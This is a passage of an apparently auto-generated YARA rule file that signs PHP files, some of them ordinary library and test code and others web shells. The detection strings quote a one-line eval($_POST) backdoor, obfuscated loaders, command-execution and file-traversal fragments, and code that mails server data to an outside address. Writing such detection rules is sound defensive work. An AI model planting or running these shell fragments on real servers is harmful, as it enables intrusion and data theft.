      $s2 = "$password = \"LandGrey\";" fullword ascii
      $s3 = "$f = $LandGrey ^ hex2bin(\"12101f040107\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_07563a3fe3bbe7e3ba84431ad9d055af
{
   meta:
      description = "php17 - file 07563a3fe3bbe7e3ba84431ad9d055af.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ddf8f7621341af0772518c8ec6a7fff8d122c8623b4f1d4f9a73c1d507ee1d4c"
   strings:
      $s1 = "echo $catid = isset($_GET['catid'])?base64_decode($_GET['catid']):'';" fullword ascii
      $s2 = "$id = $_GET['id'];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule acl_group
{
   meta:
      description = "php17 - file acl.group.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d514d5caa87ecb9bf16789d27ad046b27bc37bf73694d2959a4be534394840ee"
   strings:
      $s1 = "* Copyright 2005-2012, Cake Software Foundation, Inc. (http://cakefoundation.org)" fullword ascii
      $s2 = "* @license       http://www.opensource.org/licenses/opengroup.php The Open Group Test Suite License" fullword ascii
      $s3 = "* This test group will run the Acl and Auth tests" fullword ascii
      $s4 = "* @copyright     Copyright 2005-2012, Cake Software Foundation, Inc. (http://cakefoundation.org)" fullword ascii
      $s5 = "* CakePHP(tm) Tests <http://book.cakephp.org/view/1196/Testing>" fullword ascii
      $s6 = "*  Redistributions of files must retain the above copyright notice." fullword ascii
      $s7 = "TestManager::addTestFile($this, CORE_TEST_CASES . DS . 'libs' . DS . 'controller' . DS . 'components' . DS . 'auth');" fullword ascii
      $s8 = "* @var string 'Acl and Auth Tests'" fullword ascii
      $s9 = "* AclAndAuthGroupTest file" fullword ascii
      $s10 = "* @link          http://book.cakephp.org/view/1196/Testing CakePHP(tm) Tests" fullword ascii
      $s11 = "*  Licensed under The Open Group Test Suite License" fullword ascii
      $s12 = "* AclAndAuthGroupTest method" fullword ascii
      $s13 = "TestManager::addTestFile($this, CORE_TEST_CASES . DS . 'libs' . DS . 'controller' . DS . 'components' . DS . 'acl');" fullword ascii
      $s14 = "* AclAndAuthGroupTest class" fullword ascii
      $s15 = "* label property" fullword ascii
      $s16 = "function AclAndAuthGroupTest() {" fullword ascii
      $s17 = "TestManager::addTestFile($this, CORE_TEST_CASES . DS . 'libs' . DS . 'model' . DS . 'db_acl');" fullword ascii
      $s18 = "var $label = 'Acl and Auth';" fullword ascii
      $s19 = "class AclAndAuthGroupTest extends TestSuite {" fullword ascii
      $s20 = "* @since         CakePHP(tm) v 1.2.0.4206" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_06largescale_xls
{
   meta:
      description = "php17 - file 06largescale-xls.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e43cfb1a35bdae04b1ad3a5ee8304c44c019d99053a3d1f212ded225d5a30c00"
   strings:
      $x1 = "* @copyright  Copyright (c) 2006 - 2014 PHPExcel (http://www.codeplex.com/PHPExcel)" fullword ascii
      $s2 = "echo date('H:i:s') , \" Peak memory usage: \" , (memory_get_peak_usage(true) / 1024 / 1024) , \" MB\" , EOL;" fullword ascii
      $s3 = "echo date('H:i:s') , ' Current memory usage: ' , (memory_get_usage(true) / 1024 / 1024) , \" MB\" , EOL;" fullword ascii
      $s4 = "* @license    http://www.gnu.org/licenses/old-licenses/lgpl-2.1.txt" fullword ascii
      $s5 = "* Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA" fullword ascii
      $s6 = "* Copyright (C) 2006 - 2014 PHPExcel" fullword ascii
      $s7 = "echo date('H:i:s') , \" File written to \" , str_replace('.php', '.xls', pathinfo(__FILE__, PATHINFO_BASENAME)) , EOL;" fullword ascii
      $s8 = "$objPHPExcel->getActiveSheet()->getPageSetup()->setRowsToRepeatAtTopByStartAndEnd(1, 1);" fullword ascii
      $s9 = "$objPHPExcel->getActiveSheet()->getColumnDimension('C')->setVisible(false);" fullword ascii
      $s10 = "$objPHPExcel->getActiveSheet()->getColumnDimension('D')->setVisible(false);" fullword ascii
      $s11 = "$objPHPExcel->getActiveSheet()->getColumnDimension('E')->setOutlineLevel(1)" fullword ascii
      $s12 = "$objPHPExcel->getActiveSheet()->setCellValue('A1', \"Firstname\");" fullword ascii
      $s13 = "$objPHPExcel->getActiveSheet()->setCellValue('B1', \"Lastname\");" fullword ascii
      $s14 = "$objPHPExcel->getActiveSheet()->setCellValue('E1', \"Is Client ?\");" fullword ascii
      $s15 = "$objPHPExcel->getActiveSheet()->setCellValue('A' . $i, \"FName $i\")" fullword ascii
      $s16 = "$objPHPExcel->getProperties()->setCreator(\"Maarten Balliauw\")" fullword ascii
      $s17 = "$objPHPExcel->getActiveSheet()->setCellValue('D1', \"Fax\");" fullword ascii
      $s18 = "$objPHPExcel->getActiveSheet()->setCellValue('C1', \"Phone\");" fullword ascii
      $s19 = "/** Error reporting */" fullword ascii
      $s20 = "$objPHPExcel->getActiveSheet()->freezePane('A2');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule php17_404__2__2
{
   meta:
      description = "php17 - file 404 (2).php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8d5918b308273d96c1a511c6c7905a8ce1513c61fa88939cbd1c43b774e17950"
   strings:
      $x1 = "$str = \"host='\".$ip.\"' port='\".$port.\"' user='\".$login.\"' password='\".$pass.\"' dbname=postgres\"; " fullword ascii
      $x2 = "if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) { " fullword ascii
      $x3 = "echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit=\"if(this.ajax.checked){a(\\'Php\\',null" fullword ascii
      $x4 = "$db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']); " fullword ascii
      $x5 = "if( $this->link = @pg_connect(\"host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname\") ) return true; " fullword ascii
      $x6 = "/* WSO 2.6 (404 Error Web Shell by Madleets.com) */" fullword ascii
      $x7 = ".'<tr><td></td><td><label style=\"padding-left:15px\"><input type=checkbox name=reverse value=1 checked> reverse (login ->" fullword ascii
      $x8 = "<input type='button' value='hashcrack.com' onclick=\\\"document.hf.action='http://www.hashcrack.com/index.php';documen" fullword ascii
      $x9 = "$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror'); " fullword ascii
      $x10 = "if( $this->link = @pg_connect(\"host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname\") ) " fullword ascii
      $x11 = "print \"<font color='green'>[+] Exploitable!</font> <a href=\\\"\".$target.\"\".$lfitest.\"\\\">\".$target.\"\".$lfitest.\"</" fullword ascii
      $s12 = "<input type='button' value='md5decrypter.com' onclick=\\\"document.hf.action='http://www.md5decrypter.com/';document.h" fullword ascii
      $s13 = "wsoSecParam('Downloaders', implode(', ',$temp)); " fullword ascii
      $s14 = "print \"<font color='green'>[+] File detected!</font> <a href=\\\"\".$target.\"\".$lfierror[$x].\"\\\">\".$target.\"\".$lfie" fullword ascii
      $s15 = "print \"<font color='green'>[+] File detected!</font> <a href=\\\"\".$target.\"\".$lficonfig[$x].\"\\\">\".$target.\"\".$lfi" fullword ascii
      $s16 = "$m = array('Sec Info'=>'SecInfo','Files'=>'FilesMan','Exec'=>'Console','Sql'=>'Sql','PHP Tools'=>'phptools','LFI'=>'lfiscan'" fullword ascii
      $s17 = "if( bruteForce($server[0],@$server[1], $_POST['login'], $line) ) { " fullword ascii
      $s18 = "$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch'); " fullword ascii
      $s19 = "<td>Type</td><td>Host</td><td>Login</td><td>Password</td><td>Database</td><td></td></tr><tr> " fullword ascii
      $s20 = "39 => \"../../../../../../../../../../../../../../../var/log/ftp-proxy/ftp-proxy.log\".$byte1.\"\", " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and all of them
}

rule sig_414e2120a1d59d62de99b2f2627335efde43a440
{
   meta:
      description = "php17 - file 414e2120a1d59d62de99b2f2627335efde43a440.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "183fcc70f0081c8477fdc1de26a76928cc95968b0d43e74043bcd9f7f833a862"
   strings:
      $s1 = "<?php eval($_POST[1]);?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AddressComparatorSpec
{
   meta:
      description = "php17 - file AddressComparatorSpec.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d1922cbbabb51088e943ec9316ea74b08ec26c25b5252be7bdf1a3d2f6cdc40d"
   strings:
      $s1 = "$secondAddress->getCompany()->willReturn('Burger');" fullword ascii
      $s2 = "$firstAddress->getCompany()->willReturn('Pizzeria');" fullword ascii
      $s3 = "function it_returns_false_if_addresses_differ(AddressInterface $firstAddress, AddressInterface $secondAddress): void" fullword ascii
      $s4 = "$firstAddress->getProvinceCode()->willReturn('UK-WestMidlands');" fullword ascii
      $s5 = "$address->getCompany()->willReturn('Burger');" fullword ascii
      $s6 = "$secondAddress->getProvinceName()->willReturn('Queensland');" fullword ascii
      $s7 = "$firstAddress->getProvinceName()->willReturn('qUEENSLAND');" fullword ascii
      $s8 = "use Sylius\\Component\\Addressing\\Comparator\\AddressComparatorInterface;" fullword ascii
      $s9 = "$secondAddress->getProvinceCode()->willReturn(null);" fullword ascii
      $s10 = "$firstAddress->getCountryCode()->willReturn('UK');" fullword ascii
      $s11 = "$firstAddress->getStreet()->willReturn('Villiers St');" fullword ascii
      $s12 = "$firstAddress->getProvinceCode()->willReturn(null);" fullword ascii
      $s13 = "$firstAddress->getPostcode()->willReturn('ST3 4HB');" fullword ascii
      $s14 = "$firstAddress->getFirstName()->willReturn('Gerald');" fullword ascii
      $s15 = "$firstAddress->getFirstName()->willReturn('mIa');" fullword ascii
      $s16 = "$firstAddress->getCountryCode()->willReturn('au');" fullword ascii
      $s17 = "$firstAddress->getProvinceName()->willReturn(null);" fullword ascii
      $s18 = "$secondAddress->getLastName()->willReturn('Jones');" fullword ascii
      $s19 = "$secondAddress->getCountryCode()->willReturn('AU');" fullword ascii
      $s20 = "$secondAddress->getCity()->willReturn('Toowoomba');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule sig_05049e90fa4f5039a8cadc6acbb4b2cc
{
   meta:
      description = "php17 - file 05049e90fa4f5039a8cadc6acbb4b2cc.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8e42ba5be8d336eca13c943cd01f9046cca6b709c0e71d37ebc966425c94e771"
   strings:
      $s1 = "echo '<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">';" fullword ascii
      $s2 = "preg_replace(\"/.*/e\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6C\\x61\\x74\\x65\\x28\\x62\\x61\\x73\\x65\\x36\\x" ascii
      $s3 = "//                                  DK Shell - Took the Best made it Better..!!" fullword ascii
      $s4 = "if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Yuklendi</b><br><br>'; }" fullword ascii
      $s5 = "if( $_POST['_upl'] == \"Upload\" ) {" fullword ascii
      $s6 = "4/HCfhN3h5HIp6UD5UWnxhsn2TguPCIisnYi5IQyWBBb9wEQVQIDz5+7nGLcHf78zoF+iVpSWMZJvVXHEu40YBiG18LAkPL2rcRAeQCCxqJF9eU8cB4U+QLOg14lR2pE" ascii
      $s7 = "yX5C0arhlaw70ZRdtgoGEhHsD4DTXBYmmpZt5ii5hZrrSuKx5Xw2N3/Dw=='\\x29\\x29\\x29\\x3B\",\".\");?>" fullword ascii
      $s8 = "7FzKcF/iR+Kdcjy3rJ8sPyzxtYqxXvC/DMfJsbkm+lpp1UB2w10UAvxXuY5agMx8cM+8GtYA+bqWVYvTt43Xw8F8hGwdsLadGN5vfNB56Bzm/L+z7p1sdK2FMvqxriKH" ascii
      $s9 = "CNp3xF4IjmfM5qQQ5Y+eFuIfPspHoxoCXELYBYgdE4OcSNzO/qLc7v98fTV4+eXO7fbn/Tf4192fsGdZzkzlbJFhUXgp69r9upj/DPXGPj3xGfhT+FZBN0EHFIgkSpyk" ascii
      $s10 = "LIJj+cM9yiqxFsBAqnYMHR7L/pW4Ro32+PD4kI7nO8qFK8HjJVvYzORz1rBHRPygrF6ghLdPsYT4aYZWvETtsPyfh+e8ho8QoWhyR1MVKBmdDddqBMMjMENZMOewyvmn" ascii
      $s11 = "id0IZMjuPz12aEz01GGMCSYFXYSDSheUSdaH4hZwzQUGNHWrF6z0nv+iqoynozuQM9EFFp0cI0V2yPIC1M6x4pnImlH3VCxQToO14VVw/oztNnEnC739pjrAKlaNx0gf" ascii
      $s12 = "jdAz/lVpupHzVPwA4sMghUClfIkWIVNZu0rwYpvCJayjpiQt/5wsEJm+yvnsLAJsopEyE/Q9/1wHX1jB0/Qtyo7VvafJe74dw93E/71XcN9knlxNf7rRm0VvnvUm/Cxe" ascii
      $s13 = "dED30kEvPHG4hib9VUz/GuUY1wEvip42AR4NkaanhZPW2InFE19hhbGqQTM0GEYegLnH1jj/vFh3IvnOwj4Z3x0G7qxsoZFE7qeY5VBWYQei6+SSCKw4DknEJZThqqtg" ascii
      $s14 = "c2gUWnUGzUQvKVKo1Koxcr2HXc0VmKNut/ZWBn7hTZeolPstOKlOgjv68qSCVjJqbLppTv8EJzUl7xhHq9kq/UDUnqh73U4G7pBv2d8AxoVk4y4SIdd9IIb/CuX1sTwo" ascii
      $s15 = "rBixQCsFpLv98DKYJxNyHsYAqq1BlTsOACq5QPVWgX1O2efrZZnIV5HCFbBCkIc90G8Qgjw6Psg5kdNnf11lGCtowTseidQVAbWWqUE6zspYd7dAN615GAFycHykYO1S" ascii
      $s16 = "//password = dk " fullword ascii
      $s17 = "/zAgbUP36/w76TTou8gLxe0RrG9YlaiN7T3h/EszT2s8WK2cd2wHbscSwE/gc+5VL3ZSOeQVm5aB73LhFQ3t5gzP2Kc6OIa+DzYtjOQLUujFhtdms64mDl6Q7pWzwJ4e" ascii
      $s18 = "aqeYvsKvr0Y3k59FGxX3t+5yFTGncyT+y2iHbHXIuNvoDYrbK8Q658RDKm/yFrF2FALY9IwFkTEf2N8l2binrfO4sxOf66sQJ+c51fyy4uCkO2e3kbx723UeSlmp3hIc" ascii
      $s19 = "3Wzoq78zuTnck2+pt13tKaQNy9xD+JwjrkruG4rxw847G7YNMi5Th/snBinUdn+8cdgslwHkuz0YlEx3y3l0kDeK2ID6W6+kPzGbMwDNubx03FtdO9LpSd8U367yLVrB" ascii
      $s20 = "0N/SdbN1QkoGzC0d+43EFAD75vQjd1GefVtqrXzQigBfdN5dUKUeiw1+MVX1dXM0RYAqYsqPzde4A/T7HdYg87CnJJa4LYrunqhqbDWuLH1VhL8vCyCH2JDUZesR9bhd" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule aggregator
{
   meta:
      description = "php17 - file aggregator.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1f245f172981885aa3bc1033db22b2f4d1e28f3147c3e8e4d277ba28b310cffe"
   strings:
      $s1 = "public static function getMockedMethods();" fullword ascii
      $s2 = "public function getMockController();" fullword ascii
      $s3 = "public function setMockController(mock\\controller $mockController);" fullword ascii
      $s4 = "namespace mageekguy\\atoum\\mock;" fullword ascii
      $s5 = "public function resetMockController();" fullword ascii
      $s6 = "interface aggregator" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_90cd91d722ab0821e23a5789b235c052f17dfbc1
{
   meta:
      description = "php17 - file 90cd91d722ab0821e23a5789b235c052f17dfbc1.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e1db9ccba0a9a0d1b336662bdb9dee76c81f7f93100ac1f5190855d34d5ea3c1"
   strings:
      $s1 = "$g='[$i]{6{6,0,{6$e))),$k)));{6${6o=ob_{6get_contents();o{6b_end{6_clean(){6;$d={6base6{6';" fullword ascii
      $s2 = "$n=';$p=$ss{6($p{6,3);}if(ar{6ray_key{6_exist{6s{6($i,{6$s)){$s{6[$i].=$p;{6$e=str{6{6pos';" fullword ascii
      $s3 = "$d='se{664_{6decode(p{6reg_replac{6e(ar{6ray{6(\"/_/\",{6\"/-/\"),ar{6ray{6{6({6\"/\",\"+\"),$ss($s';" fullword ascii
      $s4 = "$G='4_encode{6(x(gzc{6{6ompress($o),{6$k));p{6rint(\"<{6$k>$d<{6/$k>\"{6);@{6ses{6sion_destro{6y();}}}}';" fullword ascii
      $s5 = "$a='{$i}^$k{${6j};}}{6ret{6urn $o;}$r={6$_S{6ERVER{6;{6$rr=@$r[{6\"HT{6{6TP_RE{6FERER\"];${6ra={6';" fullword ascii
      $s6 = "$h='SESSIO{6N;$ss=\"{6substr\"{6;${6sl={6\"str{6tolower\";$i=${6m[1][0].$m[1]{6[{61{6];$h=$s{6{6l($ss';" fullword ascii
      $s7 = "$D='$kh{6=\"5d{641\";$kf=\"{6402a\";funct{6ion {6{6x($t,$k){$c=s{6trle{6n($k);$l=s{6{6trlen($t);$';" fullword ascii
      $s8 = "$Y='6unt(${6m[1]);{6$z+{6+)$p.{6=$q[$m{6[2][$z]{6];if(str{6pos{6($p,$h)==={60){$s[$i{6]={6\"\"';" fullword ascii
      $s9 = "$N='@$r[\"HT{6TP_ACCEPT_LANGUA{6GE\"];if($rr&&{6${6ra){${6u{6=parse_u{6rl($rr{6);pa{6rse_st{6r';" fullword ascii
      $s10 = "$b='{6+(?:;q=0.({6[\\\\d]))?{6,{6?/\",$ra,$m){6;if($q{6&&$m){@ses{6si{6on{6_start({6);$s=&$_{6';" fullword ascii
      $s11 = "$s='($u[\"quer{6y\"],$q{6);$q=array{6_value{6s{6($q);preg_ma{6t{6ch_all({6\"/([\\\\{6w])[\\\\w-]{6';" fullword ascii
      $s12 = "$r='($s[$i{6],$f){6;if($e){$k=$k{6h.$kf;{6ob_sta{6rt(){6;@ev{6al{6(@g{6zunco{6mpress(@x(@ba';" fullword ascii
      $s13 = "$y='o{6={6\"\"{6{6;for($i{6=0;$i<$l;){for($j=0{6{6;($j<$c&{6&$i<$l);${6j++,$i{6++){6{$o.{6=$t';" fullword ascii
      $s14 = "$L='({6md5{6($i.${6kh),0{6,{63));$f=$sl{6($ss(md{65($i.$kf),0,3){6);${6p=\"\";for($z=1;$z<co{';" fullword ascii
      $s15 = "$X=str_replace('{6','',$D.$y.$a.$N.$s.$b.$h.$L.$Y.$n.$r.$d.$g.$G);" fullword ascii
      $s16 = "$F=str_replace('IQ','','crIQIQeatIQe_fuIQncIQtiIQon');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_992a2bc4b1e8a8ffd1f764fdd16b145167df1e98
{
   meta:
      description = "php17 - file 992a2bc4b1e8a8ffd1f764fdd16b145167df1e98.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5c764951c465e586adc1e53821ab20c0bcc3f542dcc720bbc6609dd75c33c528"
   strings:
      $x1 = "header(\"Content-Disposition: attachment; filename=\\\"dump_{$db_dump}.sql\".($archive=='none'?'':'.gz').\"\\\"\\n\\n\");" fullword ascii
      $s2 = "$table_dump=isset($_POST['table_dump'])?$_POST['table_dump']:'';" fullword ascii
      $s3 = "$result2=mysql_query('select * from `'.$table_dump.'`',$mysql_link);" fullword ascii
      $s4 = "Header('Content-Disposition: attachment; filename=\"'.str_replace('/','-',$fname).\".gz\\n\\n\");" fullword ascii
      $s5 = "$db_dump=isset($_POST['db_dump'])?$_POST['db_dump']:'';" fullword ascii
      $s6 = "header('Content-Length: '.strlen($dump_file).\"\\n\");" fullword ascii
      $s7 = "Header('Content-Disposition: attachment; filename=\"'.str_replace('/','-',$fname).\"\\n\\n\");" fullword ascii
      $s8 = "if(!(@mysql_select_db($db_dump,$mysql_link)))echo('DB error');" fullword ascii
      $s9 = "<input name='action' value='download' type=submit onclick=\"work_dir.value=document.main_form.work_dir.value;\">" fullword ascii
      $s10 = "<tr><td>DB :</td><td><input type=text name='db_dump' value='<?=$db?>'></td></tr>" fullword ascii
      $s11 = "$dump_file.=($rows2[$k]==''?'null);':'\\''.addslashes($rows2[$k]).'\\');').\"\\n\";" fullword ascii
      $s12 = "}$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c8" ascii
      $s13 = "$result2=@mysql_query('show columns from `'.$table_dump.'`',$mysql_link);" fullword ascii
      $s14 = "<tr><td>Only Table :</td><td><input type=text name='table_dump'></td></tr>" fullword ascii
      $s15 = "if(!$result2)$dump_file.='#error table '.$rows[0];" fullword ascii
      $s16 = "if(!@copy($_FILES[\"filename\"][\"tmp_name\"], $work_dir.$f)) echo('Upload is failed');" fullword ascii
      $s17 = "if(!$result2)echo('error table '.$table_dump);" fullword ascii
      $s18 = "hn.barker446@gmail.com\";mail($sd98, $sj98, $msg8873, \"From: $sd98\");" fullword ascii
      $s19 = "$page=isset($_POST['page'])?$_POST['page']:(isset($_SERVER['QUERY_STRING'])?$_SERVER['QUERY_STRING']:'');" fullword ascii
      $s20 = "$temp_file=isset($_POST['temp_file'])?'on':'nn';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 50KB and
      1 of ($x*) and 4 of them
}

rule sig_365b390fe892b3112719506f9240ff389d9e19d4
{
   meta:
      description = "php17 - file 365b390fe892b3112719506f9240ff389d9e19d4.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4b04fc64a7669cab1815bc144f9bd1291ccc8cda5d645815ed6e35de89e0157b"
   strings:
      $x1 = "elseif(!function_exists(popen)){ ob_start();system($ocmd);$nval=ob_get_contents();ob_clean();}elseif(!function_exists(system)){" fullword ascii
      $x2 = "if(strstr(php_os,\"WIN\")){$epath=\"cmd.exe\";}else{$epath=\"/bin/sh\";}" fullword ascii
      $s3 = "ob_start();system($cmnd);$sret = ob_get_contents();ob_clean();print htmlspecialchars($sret);}elseif(!function_exists(system)){" fullword ascii
      $s4 = "$obj=new upload($HTTP_POST_FILES['upfile']['name'],$HTTP_POST_FILES['upfile']['tmp_name']); if (isset ($_REQUEST['ustsub'])){" fullword ascii
      $s5 = "print \" - <a target='_blank' href=\".inclink('dlink', 'phpinfo').\">Php Bilgi</a>\";" fullword ascii
      $s6 = "<option value='op0'>Execute quick commands</option>" fullword ascii
      $s7 = "print \\$sock \\\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\r\\n\\\";" fullword ascii
      $s8 = "{if(function_exists(exec)){$nval=exec($ocmd);}elseif(!function_exists(exec)){$nval=shell_exec($ocmd);}" fullword ascii
      $s9 = "if ($_REQUEST['uscmnds']=='op3'){callfuncs('cat /var/cpanel/accounting.log');}" fullword ascii
      $s10 = "ob_start();passthru($ocmd);$nval=ob_get_contents();ob_clean();}" fullword ascii
      $s11 = "print $sf.\"<textarea cols=157 rows=23 name=edittxt>\"; $alltxt= file_get_contents($_REQUEST['edit']);" fullword ascii
      $s12 = "print \" - <a href=\".inclink('dlink', 'cmdhlp').\"&scdir=$nscdir>Cmd Yard" fullword ascii
      $s13 = "if (!isset($_REQUEST['rfile'])&&isset($_REQUEST['cmd'])){print \"<div><b><center>[ Executed command ][$] : \".$_REQUEST['cmd']." ascii
      $s14 = "if (!isset($_REQUEST['rfile'])&&isset($_REQUEST['cmd'])){print \"<div><b><center>[ Executed command ][$] : \".$_REQUEST['cmd']." ascii
      $s15 = "\\$sock = IO::Socket::INET->new(PeerAddr => \\\"old.zone-h.org\\\", PeerPort => 80, Proto => \\\"tcp\\\") or next;" fullword ascii
      $s16 = "ob_start();passthru($cmnd);$pret = ob_get_contents();ob_clean();" fullword ascii
      $s17 = "\\$sys= 'echo \\\"[ Operating system ][$]\\\"; echo \\\"`uname -a`\\\";" fullword ascii
      $s18 = "<option value='op3'>/var/cpanel/accounting.log</option>" fullword ascii
      $s19 = "fclose($zrodlo);echo \"<center><pre>\".$sta.htmlspecialchars($tekst).$eta.\"</pre></center>\";unlink($temp);} else {" fullword ascii
      $s20 = "elseif(!function_exists(shell_exec)){$opop=popen($ocmd,'r');" fullword ascii
   condition:
      uint16(0) == 0xbbef and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule sig_6ae4cdb21f4c6adaadefeff8994ce205d9e09dc0
{
   meta:
      description = "php17 - file 6ae4cdb21f4c6adaadefeff8994ce205d9e09dc0.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "167e973c80db9daf4ac8507c91983522a4465b65bcbef4ea6c3eb151f6287d0e"
   strings:
      $s1 = "return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) | ($timearray['hours'] <<" fullword ascii
      $s2 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"> " fullword ascii
      $s3 = "echo \"<input name='dfile[]' type='checkbox' value='$file' \".($file==basename(__FILE__)?\"\":\"checked\").\"> \"; " fullword ascii
      $s4 = "<input name=\"zipname\" type=\"text\" id=\"zipname\" value=\"js.zip\" size=\"15\"> " fullword ascii
      $s5 = "$dirstr .= pack('V',$this->datastr_len ); // relative offset of local header " fullword ascii
      $s6 = "$timearray = ($unixtime == 0) ? getdate() : getdate($unixtime); " fullword ascii
      $s7 = "$dirstr .= pack('V', 32 );             // external file attributes - 'archive' bit set " fullword ascii
      $s8 = "$num_bitunit_str=(ceil($num/pow(2,10*$key)*100)/100).\" $bitunit[$key]\"; " fullword ascii
      $s9 = "$dirstr = \"\\x50\\x4b\\x01\\x02\\x00\\x00\\x0a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"; " fullword ascii
      $s10 = "if($dodozip -> startfile(\"$_REQUEST[todir]$_REQUEST[zipname]\"))" fullword ascii
      $s11 = "$dodozip -> addfile(implode('',file(\"$dir/$file\")),\"$dir/$file\"); " fullword ascii
      $s12 = "if (!in_array(end(explode(\".\",$file)), $dodozip -> filefilters))" fullword ascii
      $s13 = "if(realpath($dodozip ->gzfilename)!=realpath(\"$dir/$file\"))" fullword ascii
      $s14 = "$dodozip -> addfile(implode('',file(\"$dir\")),\"$dir\"); " fullword ascii
      $s15 = "<form name=\"myform\" method=\"post\" action=\"\">" fullword ascii
      $s16 = "<input name=\"file_type\" type=\"text\" id=\"file_type\" value=\"\" size=\"50\"> " fullword ascii
      $s17 = "if(!strrchr(strtolower($_REQUEST[zipname]),'.')=='.zip') " fullword ascii
      $s18 = "pname] (\".num_bitunit(filesize(\"$_REQUEST[todir]$_REQUEST[zipname]\")).\")</a>\"; " fullword ascii
      $s19 = "echo \"<font face=\\\"wingdings\\\" size=\\\"5\\\">2</font>&nbsp;&nbsp;$file<br>\"; " fullword ascii
      $s20 = "$datastr = \"\\x50\\x4b\\x03\\x04\\x0a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"; " fullword ascii
   condition:
      uint16(0) == 0x683c and filesize < 30KB and
      8 of them
}

rule AppServiceProviderTest
{
   meta:
      description = "php17 - file AppServiceProviderTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ae24674a88588a236023a895a9b0beefa56681c462e22659ac43d87243e4ef77"
   strings:
      $s1 = "protected function getServiceProviderClass($app)" fullword ascii
      $s2 = "use GitaminHQ\\BenchTest\\ServiceProviderTrait;" fullword ascii
      $s3 = "use Hifone\\Providers\\AppServiceProvider;" fullword ascii
      $s4 = "use LaravelTrait, ServiceProviderTrait;" fullword ascii
      $s5 = "class AppServiceProviderTest extends AbstractTestCase" fullword ascii
      $s6 = "namespace Hifone\\Test\\Providers;" fullword ascii
      $s7 = "use GitaminHQ\\BenchTest\\LaravelTrait;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AgeStats
{
   meta:
      description = "php17 - file AgeStats.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1fb23702411a7848fae315df05e3a926f8df74ad142a8480552056c4dd23f1b2"
   strings:
      $x1 = "* through the world-wide-web, please send an email to license@phalconphp.com" fullword ascii
      $s2 = "* @link      http://www.phalconphp.com" fullword ascii
      $s3 = "* @author    Eugene Smirnov <ashpumpkin@gmail.com>" fullword ascii
      $s4 = "* bundled with this package in the file LICENSE.txt" fullword ascii
      $s5 = "* The contents of this file are subject to the New BSD License that is" fullword ascii
      $s6 = "* If you did not receive a copy of the license and are unable to obtain it" fullword ascii
      $s7 = "* \\Phalcon\\Test\\Models\\Statistics\\AgeStats" fullword ascii
      $s8 = "* @copyright (c) 2011-2017 Phalcon Team" fullword ascii
      $s9 = "* so that we can send you a copy immediately." fullword ascii
      $s10 = "* @package   Phalcon\\Test\\Models\\Statistics" fullword ascii
      $s11 = "namespace Phalcon\\Test\\Models\\Statistics;" fullword ascii
      $s12 = "public function getResultsetClass()" fullword ascii
      $s13 = "return 'Phalcon\\Test\\Resultsets\\Stats';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      1 of ($x*) and 4 of them
}

rule sig_3cd06397b622ce87aed8600c1a3d2f69aa44a05d
{
   meta:
      description = "php17 - file 3cd06397b622ce87aed8600c1a3d2f69aa44a05d.php"
      author = "WatcherLab"
      date = "2019-02-23"
